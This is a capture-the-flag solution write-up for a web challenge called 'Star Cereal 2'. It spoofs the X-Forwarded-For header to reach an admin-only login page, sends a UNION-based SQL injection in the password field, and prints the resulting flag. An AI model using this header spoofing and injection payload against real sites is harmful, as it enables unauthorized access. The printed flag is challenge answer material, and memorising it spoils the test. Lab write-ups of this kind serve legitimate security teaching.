# Star Cereal 2 - Solution

**Author**: zeyu2001

**Category**: Web

In `index.php`, notice the following comment

```html
<!--
Star Cereal page by zeyu2001

TODO:
	1) URGENT - fix login vulnerability by disallowing external logins (done)
	2) Integrate admin console currently hosted at http://172.16.2.155
-->
```

Point 1) is referring to the previous challenge. Point 2) is interesting.

If we go to `login.php`, we get a 403 Forbidden Page:

```html
<h1>Forbidden</h1>
<p>Only admins allowed to login.</p>
```

If we do a scan (e.g. using Burp Suite Intruder) for the 172.16.2.0/24 subnet with the `X-Forwarded-For` header, we would find that if we set:

```http
X-Forwarded-For: 172.16.2.24
```

then we would see the login page.

```html
➜  ~ curl http://localhost:55043/login.php -H 'X-Forwarded-For: 172.16.2.24'

...

<form action="/login.php" method="post">
	<div class="form-group">
		<label for="email">Email address</label>
		<input type="email" class="form-control" id="email" name="email" placeholder="Enter email">
	</div>
	<div class="form-group">
		<label for="pass">Password</label>
		<input type="pass" class="form-control" id="pass" name="pass" placeholder="Enter password">
	</div>
	<button type="submit" class="btn btn-primary">Submit</button>
</form>
```

Then, exploit SQL injection to get the flag.

```http
POST /login.php HTTP/1.1
Host: localhost:55043
X-Forwarded-For: 172.16.2.24

...

Content-Type: application/x-www-form-urlencoded
Content-Length: 51

email=test&pass=test' UNION SELECT 'test', 'test';#
```

The flag:

```
Welcome back, admin! Your flag is STC{w0w_you'r3_r3lly_a_l33t_h4x0r_bc1d4611be52117c9a8bb99bf572d6a7}
```